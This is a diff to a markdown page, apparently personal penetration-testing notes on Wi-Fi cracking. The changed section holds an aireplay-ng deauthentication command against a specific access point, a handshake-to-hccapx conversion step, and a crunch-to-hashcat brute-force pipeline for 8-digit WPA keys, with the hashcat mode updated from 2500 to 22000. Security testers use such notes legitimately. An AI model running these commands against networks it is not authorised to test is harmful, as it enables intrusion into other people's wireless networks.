@@ -310,14 +310,8 @@ aireplay-ng -0 0 -a 48:EE:0C:8E:D0:5C  wlan1mon
 # convert pcap to  hccapx
 https://hashcat.net/cap2hccapx/
 
-# if your ofline use this binary which can be installed with hashcat-utils:
- /usr/lib/hashcat-utils/cap2hccapx.bin
- 
-# or download the c code:
-wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c
-
 apt install hashcat-utils
-crunch 8 8 1234567890 | hashcat -m 2500  18081_1596091404.hccapx --status  -o cracked.txt
+crunch 8 8 1234567890 | hashcat -m 22000  18081_1596091404.hccapx --status  -o cracked.txt
 ```
 
 ### <mark style="color:orange;">Crack with John The Ripper</mark>
